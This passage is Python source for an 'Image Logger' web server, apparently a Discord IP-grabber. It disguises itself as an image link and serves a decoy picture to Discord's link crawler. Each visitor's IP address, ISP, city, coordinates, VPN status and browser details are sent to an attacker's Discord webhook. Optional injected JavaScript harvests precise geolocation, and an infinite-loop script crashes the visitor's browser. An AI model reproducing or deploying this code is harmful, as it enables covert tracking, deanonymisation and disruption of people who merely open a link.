**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
